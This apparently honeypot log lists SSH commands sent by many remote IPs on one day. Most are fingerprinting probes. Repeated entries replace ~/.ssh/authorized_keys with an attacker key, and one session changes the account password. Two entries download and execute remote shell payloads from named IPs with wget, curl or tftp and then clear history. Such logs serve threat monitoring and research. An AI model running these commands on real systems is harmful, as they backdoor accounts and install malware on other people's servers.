+2025-05-05 14:25:41 from 212.159.71.187: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 14:30:52 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:35:32 from 164.92.191.219: uname -s -v -n -r -m
+2025-05-05 14:36:30 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:37:55 from 45.147.79.140: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 14:37:56 from 45.147.79.140: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 14:39:57 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:41:15 from 45.147.79.140: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 14:41:16 from 45.147.79.140: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 14:42:41 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:42:47 from 23.95.229.171: lscpu
+2025-05-05 14:42:49 from 23.95.229.171: lscpu
+2025-05-05 14:42:51 from 23.95.229.171: lscpu
+2025-05-05 14:55:38 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 14:59:42 from 45.147.79.140: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 14:59:43 from 45.147.79.140: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 15:00:23 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 15:01:12 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 15:05:03 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:05:30 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:06:01 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:09:08 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:10:20 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:13:58 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:14:48 from 194.113.236.217: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 15:14:48 from 194.113.236.217: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 15:19:39 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:20:57 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:26:02 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:27:49 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:31:27 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:33:46 from 194.113.236.217: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 15:33:47 from 194.113.236.217: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 15:35:47 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:38:29 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:38:33 from 194.113.236.217: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 15:38:33 from 194.113.236.217: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 15:41:36 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:43:00 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:47:27 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:52:15 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 15:55:43 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:02:23 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:07:53 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:09:10 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:09:15 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:09:50 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:10:12 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:12:36 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:13:01 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:13:24 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:13:45 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:14:23 from 101.126.132.190: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 16:14:24 from 101.126.132.190: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 16:14:37 from 101.126.132.190: cat /proc/cpuinfo | grep name | wc -l
+2025-05-05 16:14:37 from 101.126.132.190: echo -e "Welcome123\nGiSRG5z4QezY\nGiSRG5z4QezY"|passwd|bash
+2025-05-05 16:14:37 from 101.126.132.190: Enter new UNIX password: 
+2025-05-05 16:14:38 from 101.126.132.190: echo "Welcome123\nGiSRG5z4QezY\nGiSRG5z4QezY\n"|passwd
+2025-05-05 16:14:39 from 101.126.132.190: cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+2025-05-05 16:14:40 from 101.126.132.190: free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+2025-05-05 16:14:41 from 101.126.132.190: ls -lh $(which ls)
+2025-05-05 16:14:41 from 101.126.132.190: which ls
+2025-05-05 16:14:41 from 101.126.132.190: crontab -l
+2025-05-05 16:14:42 from 101.126.132.190: w
+2025-05-05 16:14:43 from 101.126.132.190: uname -m
+2025-05-05 16:14:44 from 101.126.132.190: cat /proc/cpuinfo | grep model | grep name | wc -l
+2025-05-05 16:14:45 from 101.126.132.190: top
+2025-05-05 16:14:45 from 101.126.132.190: uname
+2025-05-05 16:14:46 from 101.126.132.190: uname -a
+2025-05-05 16:14:47 from 101.126.132.190: whoami
+2025-05-05 16:14:48 from 101.126.132.190: lscpu | grep Model
+2025-05-05 16:14:49 from 101.126.132.190: df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+2025-05-05 16:14:51 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:15:13 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:15:39 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:15:48 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:16:19 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:17:12 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:17:47 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:18:34 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:18:39 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:18:52 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:19:01 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:19:23 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:19:49 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:20:01 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:20:11 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:20:41 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:21:34 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:21:38 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:22:22 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:23:10 from 23.95.229.171: lscpu
+2025-05-05 16:23:12 from 23.95.229.171: lscpu
+2025-05-05 16:23:13 from 23.95.229.171: lscpu
+2025-05-05 16:23:41 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:24:33 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:25:17 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:25:48 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:25:52 from 213.186.62.33: uname -s -v -n -r -m
+2025-05-05 16:27:23 from 103.123.227.244: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 16:27:24 from 103.123.227.244: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 16:32:51 from 47.237.12.27: uname -s -v -n -r -m
+2025-05-05 16:32:52 from 47.237.12.27: uname -s -v -n -r -m
+2025-05-05 16:33:01 from 47.237.12.27: uname -s -v -n -r -m
+2025-05-05 16:33:07 from 47.237.12.27: uname -s -v -n -r -m
+2025-05-05 16:33:15 from 45.159.112.96: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 16:33:16 from 45.159.112.96: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 16:43:38 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:45:53 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:48:04 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 16:50:20 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:07:24 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:15:27 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:27:47 from 45.159.112.96: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 17:27:48 from 45.159.112.96: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 17:31:09 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:31:40 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:32:13 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:33:44 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:37:03 from 45.55.159.241: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 17:37:04 from 45.55.159.241: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 17:39:07 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:42:26 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:43:55 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:44:33 from 203.95.216.31: echo TEST
+2025-05-05 17:46:11 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:46:55 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:47:17 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:48:22 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 17:49:28 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 18:00:37 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 18:01:15 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 18:02:40 from 23.95.229.171: lscpu
+2025-05-05 18:02:42 from 23.95.229.171: lscpu
+2025-05-05 18:02:44 from 23.95.229.171: lscpu
+2025-05-05 18:10:30 from 196.251.84.225: uname -s -v -n -r -m
+2025-05-05 18:13:22 from 159.223.11.29: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 18:13:23 from 159.223.11.29: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 18:41:33 from 218.92.0.131: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c
+2025-05-05 18:43:23 from 218.92.0.131: /bin/eyshcjdmzg
+2025-05-05 18:43:24 from 218.92.0.131: ls -la /var/run/gcc.pid
+2025-05-05 18:55:37 from 104.244.74.84: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 18:55:38 from 104.244.74.84: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 19:29:36 from 104.244.74.84: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 19:29:36 from 104.244.74.84: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 19:41:42 from 23.95.229.171: lscpu
+2025-05-05 19:41:44 from 23.95.229.171: lscpu
+2025-05-05 19:41:46 from 23.95.229.171: lscpu
+2025-05-05 20:22:08 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:03:13 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:10:07 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:14:28 from 125.124.167.89: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 21:14:29 from 125.124.167.89: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 21:17:07 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:20:57 from 23.95.229.171: lscpu
+2025-05-05 21:20:59 from 23.95.229.171: lscpu
+2025-05-05 21:21:01 from 23.95.229.171: lscpu
+2025-05-05 21:21:30 from 182.176.160.82: echo TEST
+2025-05-05 21:24:07 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:29:19 from 193.112.194.81: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 21:29:20 from 193.112.194.81: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 21:31:03 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:37:55 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:44:58 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:52:10 from 43.134.231.143: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 21:52:10 from 43.134.231.143: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 21:52:11 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 21:59:18 from 193.32.162.97: uname -s -v -n -r -m
+2025-05-05 22:39:14 from 185.213.164.175: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 22:39:14 from 185.213.164.175: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 22:40:41 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:40:46 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:42:16 from 196.251.88.103: uname -s -v -n -r -m
